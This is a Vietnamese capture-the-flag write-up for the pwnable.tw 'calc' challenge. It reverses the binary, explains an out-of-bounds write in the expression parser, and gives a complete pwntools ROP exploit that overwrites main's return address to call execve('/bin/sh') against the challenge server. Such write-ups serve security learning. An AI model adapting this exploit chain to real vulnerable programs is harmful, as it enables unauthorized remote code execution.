# PWNABLE.TW CALC

đầu tiên chúng ta hãy cùng đi reverse chương trình để có thể hiểu chương trình hoạt động như nào

Hàm main không có gì đặc sắc cả cái chung ta quan tâm đó là hàm calc:

![image](https://user-images.githubusercontent.com/93699926/230762886-32422685-786a-436b-9aad-5afdb15cce2e.png)

Chương trình khởi tạo một mảng kiểu int với 101 phần tử và một mảng kiểu char với 1024 phần tử

Chương trình nhảy vô vòng lặp và mỗi lần chạy nó sẽ khởi tạo lại viến v2 thành 0 tất cả 1024 phần tử
và sau đó thì gọi hàm get_expr

![image](https://user-images.githubusercontent.com/93699926/230763052-ec0d202b-b2db-40c8-a607-2eedbcb5a75e.png)

Hàm get_expr này giống như một chiếc filter để kiểm tra tất cả các ký tự chúng ta nhập vô , kiêrm tra từng byte một ,byte by byte

Và nó chỉ cho phép ta nhập các ký tự trong danh sách sau [0 đến 9,+,*,%,/,-]

Và nếu như biến v5 khi trả về = 0 thì chương trình sẽ thoat khỏi vòng loop 

Vậy ta có thể thoát khỏi hàm calc bằng cách nhập duy nhất ký tự "\n"

sau đó chương trình tiếp tục gọi hàm init_pool:

![image](https://user-images.githubusercontent.com/93699926/230763233-a4df0a47-fc0b-4b89-9200-980d4e1380fa.png)

Đọc qua thì ta có thể hiểu được rằng ở mỗi lần chạy thì chương trình sẽ thiết lập 101 phần tử của biến NUMS thành 0 

Giờ đến hàm quan trọng nhất của chương trình đo là hàm parse_expr:

Hàm này rất dài, nên mình sẽ chụp từng phần và giải thích :


![image](https://user-images.githubusercontent.com/93699926/230763333-a7242a82-4ea9-46d8-a770-b73ed1bc4118.png)

chương trình sẽ chạy vòng for loop, kiểm tra tới ký tự nào trong a1=[+,-,%,*,/]

sau đó nó sẽ nó sẽ malloc một biến v8 bằng vế đằng sau các ký tự được liệt kê trên. VD a1=123+3 thì nó sẽ kiểm tra đến hết dấu "+" rồi thì v8="3" sau đó nó sẽ thêm ký tự null vô cuối v8 và dùng hàm strcmp để so sánh v8 với 0x30(hay "0")
nếu v8 =0 thì nó sẽ print ra dòng chữ "prevent division by zero" và không thực hiện tiếp tức là tất cả các phép tính với vế sau =0 đề sẽ không được thực hiện

![image](https://user-images.githubusercontent.com/93699926/230763715-409dc3a9-caf9-4e96-9711-6aa795097e80.png)

Tiếp tục với phần còn lại của cái hàm siêu dài này :

![image](https://user-images.githubusercontent.com/93699926/230763809-52047cb9-0f03-4644-b869-431ba58e6890.png)

![image](https://user-images.githubusercontent.com/93699926/230763829-f89ff168-e7c0-4633-9d99-61ecb6f86013.p

Ở phần tiếp theo của chương trình thì biến v8 sẽ được chuyển từ ký tự sang số nhờ hàm atoi
, ở đây mình đã đặt tên lại biến v2 thành count .nếu như biến v9 >0 thì count sẽ bằng  NUMS++, và NUMS[count+1] =v9
.Phần sau chỉ đơn giản là thực hiện kiểm tra các biểu thức cộng nhân chia và sau dó nó sẽ gọi hàm eval để tính toán 

![image](https://user-images.githubusercontent.com/93699926/230764530-1c5c7748-2fc2-43d8-b045-9ee0f1758455.png)

như ta có thể thấy chương trình sẽ thực hiện các biểu thức +,-,*,/ và sau đó nó sẽ lưu kết quả vô NUMSƠ[NUMS-1] hay NUMS[count]

Test qua chương trình ta thấy như sau

![image](https://user-images.githubusercontent.com/93699926/230764904-39392281-9c4c-403d-a4c5-d64bc575b4bd.png)

sau khi ta nhập sai nư trên thì ta có thể thấy chương trình không báo lỗi mà lại in ra giá trị tại địa chỉ NUMS[10] = 0 như ta thấy thử tiếp thì ta thấy rằng có thể thay đối giá trị tại địa chỉ nào đó bằng cú pháp nhưu sau:

![image](https://user-images.githubusercontent.com/93699926/230765827-ff2e7880-6913-4378-ad5e-a0738444d8f3.png)

dây là link bài viết mà mình đã tham khảo khi làm bài https://drx.home.blog/2019/04/07/pwnable-tw-calc/#more-705
Bạn có thể xem để có được sự giải thích rõ hơn ,vậy với bug trong tay thì mình sẽ đi khai thác chương trình

# Ý tưởng
mình sẽ nhắm tơi với thay đổi return address của hàm main với các gadget của mình và thực thi hàm execve
.Các gadget mà mình cần như sau 

```

rw_section = 0x80eda00 ; đây là địa chỉ mình sẽ ghi string "/bin/sh", các bạn có thể tự kiểm tra trong gdb , vì pie không bật nên ta có được ngây địa chỉ 
pop_eax = 0x0805c34b
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
int_80_ret = 0x0807087e

```

giờ ta sẽ đi tính khoảng cách từ NUMS cho đến saved eip của main , mình sẽ đặt lệnh b* ở câu lệnh leave của hàm main và ở calc+20 đê có thể xem được địa chỉ NUMS (ta biết nó ở địa chỉ Esp+0x18)

![image](https://user-images.githubusercontent.com/93699926/230766186-5f72255a-3bcb-45fb-86ad-a0f51b79d8d8.png)

![image](https://user-images.githubusercontent.com/93699926/230766209-ed140794-c17a-4ba4-8ddb-b6bba83edc3c.png)

Ta có 0xffffcca8 là địa chỉ của NUMS và 0xffffd26c là địa chỉ của saved eip của main
. (0xffffd26c-0xffffcca8)/4=369 vậy để có thể ghi được vào saved eip của main ta cần thực hiện cú pháp là +368+<gía trị của gadget > Lưu ý ta cần +368 vì khi đọc hàm parse_expr sẽ lưu kết quả vô NUMS[NUMS-1]+=NUMS[NUMS] 
.Vậy nếu ta nhập +368+<gía trị của gadget > thì saved eip sẽ là giá trị của gadget ta ghi và giá trị được in ra màn hình sẽ là giá trị của NUMS[368]+<giá trị của gadget>

Vì khi ta viết thực hiện các toán tử những địa chỉ phía sau sẽ bị thay đổi bởi địa chỉ phía trước nên ta sẽ viết payload ngược lại từ địa chỉ eip+địa chỉ <gadget cuối cùng> cho đến eip + địa chỉ <gadgget đầu tiên> 

Và một điều nữa chúng ta không thể sử dụng giá trị 0 để ghi vào địa chỉ vì như mình giải thích ở trên chương trình không cho phép ta nhập vô vế sau =0 và nó sẽ báo lõi "prevent divíion by zero"
vậy ta sẽ làm điều này như sau :

+) TH1 nếu NUMS[NUMS-1]= đúng với giá trị gadget ta ghi vô  trước đó thì ta chỉ cần ghi thêm 1 lần nữa đứng với địa chỉ đó và với giá trị của gadget đó nhưng lần này là với toán tử trừ 
VD : +368+100=> kết quả in ra là 100 thì ta ghi thêm 1 lần nữa là +368-100 thì kết quả in ra sẽ là 0 vậy là ta thành công thay đổi ký địa chỉ phía trước thành NULL

![image](https://user-images.githubusercontent.com/93699926/230766848-cf1e9ea6-e647-449b-888d-d04fdb76d436.png)

còn nếu in ra kết quả khác với gadget ta ghi trước đó thì tức là địa chỉ đó trước đó đã có một giá trị khác , giá trị này có thể âm hoặc dương 
+) nếu đó là đại chỉ dương thì ta cần + thêm làm sao để nó trở thành 0x100000000(4 byte 0) 
+) còn nếu nó là âm thì ta cần biết là giá trị âm khi được biểu diễn trong máy tính sẽlà một số rất lớn vd 1234=0x4d2 còn nếu -1234=0xfffffb2e
nên ta nếu là só âm ta sẽ dùng struct trong python để biến đổi và thực hiện phép tính

```
from pwn import *
import struct
exe= context.binary=ELF("./calc",checksec = False)

#p=process(exe.path)
p=remote("chall.pwnable.tw", 10100)
def GDB():
	gdb.attach(p,gdbscript=
		'''
		
		b*0x080494a5
		c
		'''
		)
	input()

def getnum(num,need):
	if num<0:
		num=int.from_bytes(struct.pack("<i",num),"little")
	num=struct.unpack("<i",p32(0x100000000-num-need))
	num=str(num)
	if "-" not in num:
		num="+"+num 
	return num

exe_base=0x8048000
##### gadgets########################
eip = 368
rw_section = 0x80eda00
pop_eax = 0x0805c34b
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
int_80_ret = 0x0807087e

payload_list = [
	# read(0, rw_section, 0x200)
	pop_eax, 3,
	pop_ecx_ebx, rw_section, 0,
	pop_edx, 0x200,
	int_80_ret,
	pop_eax, 0xb,
	pop_ecx_ebx, 0, rw_section,
	pop_edx, 0,
	int_80_ret
	]
GDB()
p.recvline()
for i in range(len(payload_list)-1, -1, -1):
	# We don't want program print out anything unrelated to number
	if payload_list[i]==0:
		continue

	# If we have 4-byte null before current inputing number
	if payload_list[i-1]==0:
		payload = f'+{eip+i}+{payload_list[i]}'.encode()
		p.sendline(payload)
		recv = int(p.recvline()[:-1])
		print(recv, payload_list[i])
		
		# If number is equal, just simply subtract
		if recv==payload_list[i]:
			payload = f'+{eip+i}-{payload_list[i]}'.encode()
			p.sendline(payload)
			p.recvline()
		# If number is not equal, means something added
		# Make previous number to opposite of number want to add of current number 
		else:
			t = getnum(recv, payload_list[i])
			payload = f'+{eip+i}{t}'.encode()
			p.sendline(payload)
			p.recvline()
			payload = f'+{eip+i}+{payload_list[i]}'.encode()
			p.sendline(payload)
			p.recvline()
		
	else:
		payload = f'+{eip+i}+{payload_list[i]}'.encode()
		p.sendline(payload)
		p.recvline()
p.sendline()
p.sendline(b"/bin/sh\x00")
p.interactive()
```
# flag

![image](https://user-images.githubusercontent.com/93699926/230767196-ab12017b-0d41-48f5-bbb8-2f815a2b9507.png)


